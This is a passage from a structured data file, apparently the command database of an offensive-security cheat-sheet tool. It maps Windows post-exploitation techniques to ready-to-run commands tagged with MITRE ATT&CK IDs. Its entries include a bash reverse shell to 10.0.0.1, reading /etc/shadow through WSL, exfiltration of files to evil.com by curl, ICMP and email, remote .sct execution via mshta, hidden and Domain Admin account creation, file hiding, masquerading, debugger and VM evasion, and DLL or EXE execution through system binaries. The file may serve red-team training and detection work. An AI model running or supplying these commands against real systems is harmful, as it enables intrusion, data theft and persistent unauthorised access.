    'Enumerate System': {
        'Dir (Env)': {
            'cmd': 'dir env:',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command enumerates environment variables.',
        },
        'Driverquery': {
            'cmd': 'driverquery /v /fo list;driverquery /si /fo list',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1652', 'url': 'https://attack.mitre.org/techniques/T1652/'},
            'lolbas': null,
            'desc': 'The command enumerates device driver information.',
        },
        'Fsutil (drives)': {
            'cmd': 'fsutil fsinfo drives',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates all drives on the target system.',
        },
        'Hostname': {
            'cmd': 'hostname',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': null,
        },
        'Net (time)': {
            'cmd': 'net time \\\\ComputerName',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1124', 'url': 'https://attack.mitre.org/techniques/T1124/'},
            'lolbas': null,
            'desc': 'The command displays the system time on the target computer.',
        },
        'PowerShell (Get-ChildItem, Env)': {
            'cmd': 'Get-ChildItem Env:',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command enumerates environment variables.',
        },
        'PowerShell (Get-CimInstance, PnP)': {
            'cmd': 'Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = \'Image\' OR PNPClass = \'Camera\')"',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates information of PlugNPlay camera.',
        },
        'PowerShell (Get-CimInstance, SerialNumber)': {
            'cmd': '(Get-CimInstance -Classname Win32_BIOS -Property SerialNumber).SerialNumber',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command displays the serial number.',
        },
        'PowerShell (Get-ComputerInfo)': {
            'cmd': 'Get-ComputerInfo',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates computer information.',
        },
        'PowerShell (Get-Date)': {
            'cmd': 'Get-Date',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1124', 'url': 'https://attack.mitre.org/techniques/T1124/'},
            'lolbas': null,
            'desc': 'The command displays the system time.',
        },
        'PowerShell (Get-HotFix)': {
            'cmd': 'Get-HotFix -description "Security update"',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates patches. We may find vulnerabilities (https://msrc.microsoft.com/update-guide/vulnerability) from the information.',
        },
        'PowerShell (Get-PSDrive)': {
            'cmd': 'Get-PSDrive',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates connected devices.',
        },
        'PowerShell (Reg)': {
            'cmd': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command displays the system language.',
        },
        'Set': {
            'cmd': 'cmd /c set',
            'cli': null,
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command enumerates environment variables.',
        },
        'Systeminfo': {
            'cmd': 'systeminfo',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': null,
        },
        'Ver': {
            'cmd': 'cmd /c ver',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command prints OS information.',
        },
        'Wmic (nic)': {
            'cmd': 'wmic nic get macaddress,name /format:csv',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates network information.',
        },
        'Wmic (os)': {
            'cmd': 'wmic os get buildnumber,caption,countrycode,osarchitecture,oslanguage,ostype,registereduser,serialnumber,version,windowsdirectory /format:csv',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates OS information.',
        },
        'Wmic (qfe)': {
            'cmd': 'wmic qfe get Caption,Description,HotFixID,InstalledOn',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates patches. We may find vulnerabilities (https://msrc.microsoft.com/update-guide/vulnerability) from the information.',
        },
    },
    'Enumerate WSL': {
        'Wsl': {
            'cmd': 'wsl -e cat /etc/passwd',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': null,
            'desc': 'We can operate WSL via \'wsl.exe\' command.',
        },
        'Wsl (Root privilege)': {
            'cmd': 'wsl -u root -e cat /etc/shadow',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/',
            'desc': 'The command operates WSL as root user.',
        },
    },
    'Evade Debuggers': {
        'PowerShell (Get-Process)': {
            'cmd': 'Get-Process | Where-Object { $_.ProcessName -match "dbg" -or $_.ProcessName -match "debug" }',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1622', 'url': 'https://attack.mitre.org/techniques/T1622/'},
            'lolbas': null,
            'desc': 'The command detects running common debugger processes.',
        },
    },
    'Evade VMs/Sandboxes': {
        'PowerShell (Get-WmiObject 1)': {
            'cmd': '$error.clear();Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue;if ($error) {echo "Virtual Environment detected"}',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command detects a virtual environment on the target machine.',
        },
        'PowerShell (Get-WmiObject 2)': {
            'cmd': '$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty "Manufacturer";$Model = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty "Model";if ($Manufacturer.ToLower().contains("vmware")) {echo "VMWare detected"};if ($Model.ToLower() -eq "virtualbox") {echo "VirtualBox detected"}',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command detects VirtualBox or VMWare.',
        },
    },
    'Execute ADS': {
        'Cmd': {
            'cmd': 'cmd /c start "" "file.docx:payload.bat"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
            'desc': null,
        },
        'Mshta': {
            'cmd': 'mshta "C:\\file.txt:evil.hta"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': 'The command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
        },
        'Wmic': {
            'cmd': 'wmic process call create "C:\\file.txt:evil.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        },
        'Wscript': {
            'cmd': 'wscript C:\\file.txt:evil.js',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wscript/',
            'desc': 'The command executes arbitrary Javascript code embedded in another file.',
        },
    },
    'Execute Code/Command': {
        'Bash': {
            'cmd': 'bash -c "echo hello"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Bash (Reverse Shell)': {
            'cmd': 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'PowerShell (Get-Clipboard)': {
            'cmd': 'echo whoami | clip;Get-Clipboard | iex',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1115', 'url': 'https://attack.mitre.org/techniques/T1115/'},
            'lolbas': null,
            'desc': 'The command copies arbitrary command and executes it by pasting with the Get-Clipboard cmdlet.'
        },
        'PowerShell (iex, .NET)': {
            'cmd': 'iex \'[System.Reflection.Assembly]::Load("System.Windows.Forms");[System.Windows.Forms.MessageBox]::Show("Hello world")\'',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1059.001', 'url': 'https://attack.mitre.org/techniques/T1059/001/'},
            'lolbas': null,
            'desc': 'The command opens MessageBox.'
        },
        'PowerShell (Import-Clixml)': {
            'cmd': '"whoami" | Export-clixml evil.xml;iex $(Import-Clixml evil.xml)',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command creates a XML file that contains arbitrary command, then execute the command.',
        },
        'PowerShell (Start-Job)': {
            'cmd': '$Job = Start-Job {Write-Host "Hello!"};Wait-Job -Job $Job;Receive-Job -Job $Job;Remove-Job -Job $Job',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command creates a new job to execute command, then receive the result and remove it.',
        },
        'Rundll32 (Shell32)': {
            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe" "/c echo hello > hello.txt"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
            'desc': null,
        },
        'Wsl': {
            'cmd': 'wsl cmd.exe /c whoami',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': null,
            'desc': 'The command executes arbitrary command via WSL. Note that the WSL needs to be enabled in the target system.',
        },
    },
    'Execute DLL': {
        'Msiexec (/y)': {
            'cmd': 'msiexec /y C:\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.007', 'url': 'https://attack.mitre.org/techniques/T1218/007/'},
            'lolbas': null,
            'desc': null,
        },
        'Msiexec (/z)': {
            'cmd': 'msiexec /z C:\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.007', 'url': 'https://attack.mitre.org/techniques/T1218/007/'},
            'lolbas': null,
            'desc': null,
        },
        'Register-CimProvider': {
            'cmd': 'C:\\Windows\\SysWOW64\\Register-CimProvider.exe -Path .\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218', 'url': 'https://attack.mitre.org/techniques/T1218/'},
            'lolbas': null,
            'desc': null,
        },
        'Regsvr32': {
            'cmd': 'regsvr32 /s .\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.010', 'url': 'https://attack.mitre.org/techniques/T1218/010/'},
            'lolbas': null,
            'desc': null,
        },
        'Rundll32': {
            'cmd': 'rundll32 evil.dll,EntryPoint',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': 'Replace \'EntryPoint\' with the actual entry point of the DLL such as "DllMain" or other exported function marked with \'__declspec(dllexport)\'.',
        },
        'Rundll32 (Shell32)': {
            'cmd': 'rundll32 shell32.dll,Control_RunDLL C:\\evil.dll',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
            'desc': 'The DLL path (e.g. \'C:\\evil.dll\') must be absolute path.',
        },
    },
    'Execute EXE': {
        'Bash': {
            'cmd': 'bash -c "cmd.exe /c evil.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bash/',
            'desc': null,
        },
        'Conhost 1': {
            'cmd': 'conhost evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Conhost/',
            'desc': null,
        },
        'Conhost 2': {
            'cmd': 'conhost --headless evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Conhost/',
            'desc': null,
        },
        'Echo (Shortcut)': {
            'cmd': 'echo [InternetShortcut] > .\\example.url;echo URL=C:\\evil.exe >> .\\example.url;.\\example.url',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1547.009', 'url': 'https://attack.mitre.org/techniques/T1547/009/'},
            'lolbas': null,
            'desc': 'The command modifies shortcuts to execute artibrary file.',
        },
        'Explorer 1': {
            'cmd': 'explorer C:\\Windows\\System32\\calc.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Explorer/',
            'desc': null,
        },
        'Explorer 2': {
            'cmd': 'explorer /root,"C:\\Windows\\System32\\calc.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Explorer/',
            'desc': null,
        },
        'Forfiles': {
            'cmd': 'forfiles /p C:\\Windows\\System32 /m notepad.exe /c C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Forfiles/',
            'desc': 'The command searches \'notepad.exe\' in the \'C:\\Windows\\System32\\\' directory then if found it, execute arbitrary executable file.',
        },
        'PowerShell (Invoke-WmiMethod)': {
            'cmd': '$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"));$NewClass = $Class.Derive("Win32_Evil").Put();Invoke-WmiMethod -Path Win32_Evil -Name create -ArgumentList evil.exe',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': false,
            'desc': null,
        },
        'Pcalua': {
            'cmd': 'pcalua -a .\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Pcalua/',
            'desc': null,
        },
        'Psexec': {
            'cmd': 'psexec \\\\example.local -accepteula evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
            'lolbas': null,
            'desc': 'Replace \'example.local\' with the address or the computer name of the target system. Additionally, it may need to specify username (\'-u\') and password (\'-p\').',
        },
        'Rundll32 (Pcwutl)': {
            'cmd': 'rundll32 pcwutl.dll,LaunchApplication .\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': null,
        },
        'Rundll32 (Shell32)': {
            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': null,
        },
        'Schtasks': {
            'cmd': 'schtasks /Create /SC MINUTE /MO 1 /TN "My Task" /TR C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
            'desc': 'The command adds the task that executes arbitrary .exe file every minute.',
        },
        'Wmic': {
            'cmd': 'wmic process call create C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        },
        'Wsl': {
            'cmd': 'wsl /mnt/c/Users/Public/evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
            'lolbas': null,
            'desc': 'The command executes a PE file via WSL. Note that the WSL needs to be enabled in the target system.',
        },
    },
    'Execute JavaScript': {
        'Mshta (hta)': {
            'cmd': 'mshta C:\\evil.hta',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': 'This command executes arbitrary JavaScript code in the .hta file. The .hta file must consist of HTML source code.',
        },
        'Mshta (sct)': {
            'cmd': 'mshta javascript:a=(GetObject(\'script:https://evil.com/evil.sct\')).Exec();close();',
            'cli': 'Command Prompt',
            'adminRequired': false,
            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1112/'},
            'lolbas': null,
            'desc': 'The command executes arbitrary JavaScript code in the .sct file.',
        },
    },
    'Exfiltrate': {
        'Curl': {
            'cmd': 'curl -k -F "file=@./data.txt" https://evil.com/',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1041', 'url': 'https://attack.mitre.org/techniques/T1041/'},
            'lolbas': null,
            'desc': 'The command uploads the file to the attacker\'s server.',
        },
        'Net': {
            'cmd': 'net use * "\\\\example.com\\shared_folder" / TRANSPORT:QUIC /SKIPCERTCHECK;copy ".\\data.txt" "Z:\\data.txt"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
            'lolbas': null,
            'desc': 'The command transfers the file to the shared folder over SMB.',
        },
        'PowerShell (Invoke-WebRequest)': {
            'cmd': '$content = Get-Content .\\data.txt;iwr -uri http://10.0.0.1 -Method POST -Body $content',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
            'lolbas': null,
            'desc': 'The command sends data to the attacker\'s HTTP server.',
        },
        'PowerShell (New-SmbMapping)': {
            'cmd': 'New-SmbMapping -RemotePath "\\\\example.com\\shared_folder" -TransportType QUIC -SkipCertificateCheck;copy ".\\data.txt" "Z:\\data.txt"',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1570', 'url': 'https://attack.mitre.org/techniques/T1570/'},
            'lolbas': null,
            'desc': 'The command transfers the file to the shared folder over SMB.',
        },
        'PowerShell (Ping)': {
            'cmd': '$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\data.txt -Encoding Byte -ReadCount 1024) {$ping.Send("evil.com", 1500, $Data)}',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
            'lolbas': null,
            'desc': 'The command sends ICMP packets with arbitrary file data to the attack server.'
        },
        'PowerShell (Send-MailMessage)': {
            'cmd': 'Send-MailMessage -From sender@evil.com -To recipient@evil.com -Subject "Hello" -Attachments C:\\data.txt -SmtpServer 10.0.0.1',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
            'lolbas': null,
            'desc': 'The command sends a mail attached a file to the attack server.',
        },
        'Rclone': {
            'cmd': 'rclone config create ftpserver "ftp" "host" "ftp.dlptest.com" "port" "21" "user" "dlpuser" "pass" "rNrKYTX9g7z3RgJRmxWuGHbeu";rclone.exe copy --max-age 2y C:\\data.zip ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
            'lolbas': null,
            'desc': 'The command sends a data file (\'data.zip\') to the FTP server (\'ftp.dlptest.com\'). rclone.exe is not a built-in binary, so it must exist on the target system.',
        },
    },
    'Hide Files': {
        'Attrib': {
            'cmd': 'attrib +h +s .\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
            'lolbas': null,
            'desc': 'The command hides a file so innocent users cannot see the file (+h), and add System Attribute (SA) to disallow to delete this file with common operations. However, the \'-Hidden\' or \'-Force\' options of the \'dir\' command can display hidden files.'
        },
        'PowerShell': {
            'cmd': '$file = Get-Item .\\evil.exe;$file.attributes = \'Hidden,System\'',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1564.001', 'url': 'https://attack.mitre.org/techniques/T1564/001/'},
            'lolbas': null,
            'desc': 'The command hides a file and adds System Attribute (SA) to disallow to delete thie file with common operations.',
        },
        'Reg': {
            'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1564.001', 'url': 'https://attack.mitre.org/techniques/T1564/001/'},
            'lolbas': null,
            'desc': 'The command hides files in explorer.'
        },
    },
    'Install Drivers': {
        'Pnputil': {
            'cmd': 'pnputil -i -a C:\\evil.inf',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1547', 'url': 'https://attack.mitre.org/techniques/T1547/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Pnputil/',
            'desc': 'The command installs a driver with the INF file.',
        },
    },
    'Manipulate Accounts': {
        'Dsadd (computer)': {
            'cmd': 'dsadd computer "CN=MACHINE-0,CN=Computers,DC=example,DC=local"',
            'cli': null,
            'adminRequired': true,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command creates a new computer account in Active Directory. To delete it, execute \'dsrm "CN=MACHINE-0,CN=Computers,DC=example,DC=local"\' command.',
        },
        'Dsadd (user)': {
            'cmd': 'dsadd user "CN=Evil,CN=Users,DC=example,DC=local" -pwd "Password@123" -ln "Hell" -fn "Evil" -email "evil@example.local" -display "Evil"',
            'cli': null,
            'adminRequired': true,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command creates a new user account in Active Directory. To delete it, execute \'dsrm "CN=Evil,CN=Users,DC=example,DC=local"\' command.',
        },
        'Net (Change Password)': {
            'cmd': 'net user John Password123',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1531', 'url': 'https://attack.mitre.org/techniques/T1531/'},
            'lolbas': null,
            'desc': 'The command changes the existing user password.',
        },
        'Net (Create User)': {
            'cmd': 'net user "evil" "Password@123" /add /domain; net group "Domain Admins" "evil" /add /domain',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1136.001', 'url': 'https://attack.mitre.org/techniques/T1136/001/'},
            'lolbas': null,
            'desc': 'The command creates a new local user and add it to the Administrator group. To delete the account, execute \'net localgroup Administrators evil /delete;net user evil /delete\'.',
        },
        'Net (Create Hidden User)': {
            'cmd': 'net user $ Password123 /add',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1564', 'url': 'https://attack.mitre.org/techniques/T1564/'},
            'lolbas': null,
            'desc': 'The command creates a hidden user by specifying \'$\'. This user is not displayed with the \'net user\' command. To delete it, run \'net user $ /delete\' command.',
        },
        'PowrShell (New-ADComputer)': {
            'cmd': 'New-ADComputer -Name "MACHINE-0"',
            'cli': null,
            'adminRequired': true,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command creates a new computer account in Active Directory. To delete it, execute \'Remove-ADComputer -Identity "CN=MACHINE-0,CN=Computers,DC=example,DC=local"\' command.'
        },
        'PowerShell (New-ADUser)': {
            'cmd': 'New-ADUser Evil -SurName Hell -GivenName Evil -DisplayName Evil -EmailAddress evil@example.local -AccountPassword (ConvertTo-SecureString -AsPlainText "Password@123" -Force) -Enabled $true',
            'cli': null,
            'adminRequired': true,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command creates a new user account in Active Directory. To delete it, execute \'Remove-ADUser -Identity "CN=Evil,CN=Users,DC=example,DC=local"\' command.',
        },
        'PowerShell (Rename-Computer)': {
            'cmd': 'Rename-Computer -NewName MYSERVER -Force',
            'cli': null,
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command changes the current computer name. The system need to restart to apply the change.',
        },
        'Pspasswd': {
            'cmd': 'pspasswd John Password123',
            'cli': null,
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command changes the user\'s password.',
        },
    },
    'Masquerade': {
        'Copy': {
            'cmd': 'copy .\\evil.exe C:\\Windows\\Temp\\svchost.exe;C:\\Windows\\Temp\\svchost.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1036.003', 'url': 'https://attack.mitre.org/techniques/T1036/003/'},
            'lolbas': null,
            'desc': 'The command changes the malicious executable file to the legitimate-looking file path.',
        },
    },
    'Modify Code Signing Policy': {
        'Bcdedit': {
            'cmd': 'bcdedit /set testsigning on',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1553.006', 'url': 'https://attack.mitre.org/techniques/T1553/006/'},
            'lolbas': null,
            'desc': 'The command enables the execution of unsigned drivers. To disable it, set \'off\' in the below command.'
        },
    },
    'Modify File Permissions': {
        'Icacls': {
            'cmd': 'icacls .\\file_or_dir /grant Everyone:F',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
            'lolbas': null,
            'desc': 'The command grands permission of the file/directory to all users.',
        },
        'Takeown': {
            'cmd': 'takeown /f .\\file_or_dir /r',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
            'lolbas': null,
            'desc': 'The command resets a file/directory permission to allow the current user to own.',
        },
    },
    'Monitor Clipboard': {
        'PowerShell (Get-Clipboard)': {
            'cmd': 'Get-Clipboard',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1115', 'url': 'https://attack.mitre.org/techniques/T1115/'},
            'lolbas': null,
            'desc': 'The command displays the contents of the clipboard.',
        },
    },
    'Obfuscate': {
        'Certutil': {
            'cmd': 'certutil -encode evil.exe evil_enc.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1027', 'url': 'https://attack.mitre.org/techniques/T1027/'},
            'lolbas': null,
            'desc': 'The command encodes the file to Base64. To decode it, execute \'certutil -decode\' command.',
        },
        'PowerShell (Python)': {
            'cmd': '$encPayload = $(python3 -c \'import base64;enc=base64.b64encode(\\"echo hello\\".encode());print(enc.decode())\');iex $(python3 -c "import base64;print(base64.b64decode(\'$encPayload\').decode())")',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1027.010', 'url': 'https://attack.mitre.org/techniques/T1027/010/'},
            'lolbas': null,
            'desc': 'The command encodes arbitrary command to Base64 and executes it after decoding.',
        },
    },
    'Persistence': {
        'Netsh': {
            'cmd': 'netsh add helper C:\\evil.dll',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1546.007', 'url': 'https://attack.mitre.org/techniques/T1546/007/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
            'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run.'
        },
        'Reg (Atbroker)': {
